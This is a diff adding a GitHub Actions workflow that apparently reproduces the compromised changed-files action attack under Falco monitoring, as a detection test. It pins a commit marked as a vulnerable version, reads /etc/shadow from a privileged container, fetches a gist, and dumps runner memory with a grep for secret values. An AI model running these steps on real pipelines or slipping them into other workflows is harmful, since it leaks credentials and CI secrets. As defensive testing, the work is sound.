@@ -1,0 +1,64 @@
+on:
+  pull_request:
+    branches:
+      - master
+
+jobs:
+  changed_files:
+    runs-on: ubuntu-latest  
+    name: Test changed-files
+    steps:          
+      - uses: actions/checkout@v4
+
+      - name: Start Falco
+        uses: falcosecurity/falco-actions/start@f67ddcc4b202aae0ab3d7194159c9c947ae77791
+        with:
+          mode: analyze
+          falco-version: '0.39.0'
+          verbose: true
+          cicd-rules: true
+
+      - name: Get changed files
+        id: changed-files
+        uses: trmlabs/changed-files@eb3c72d826fc4f9a9af40679c867cfdcf2e88012 # vulnerable version
+
+      - name: List all changed files
+        env:
+          ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
+        run: |
+          for file in ${ALL_CHANGED_FILES}; do
+            echo "$file was changed"
+          done
+
+      - name: Read Sensitive File
+        run: |
+          sleep 3
+          docker run --rm --privileged ubuntu cat /etc/shadow
+
+      - name: Changed file payload
+        run: |
+          sleep 3
+          # Simulate gist download
+          curl https://gist.github.com/loresuso/21b871c2c701bc431be6c82234d40b28
+          # Simulate payload
+          sudo python3 memdump.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u
+
+      - name: Stop Falco
+        uses: falcosecurity/falco-actions/stop@f67ddcc4b202aae0ab3d7194159c9c947ae77791
+        with:
+          mode: analyze
+          verbose: true
+
+  analyze-job:
+    runs-on: ubuntu-latest
+    needs: changed_files
+    permissions:
+      contents: read
+      actions: read
+    steps:
+    - name: Analyze
+      uses: falcosecurity/falco-actions/analyze@f67ddcc4b202aae0ab3d7194159c9c947ae77791
+      with:
+        falco-version: '0.39.0'
+        custom-rule-file: '${{ github.workspace }}/cicd.yaml'
+        verbose: true
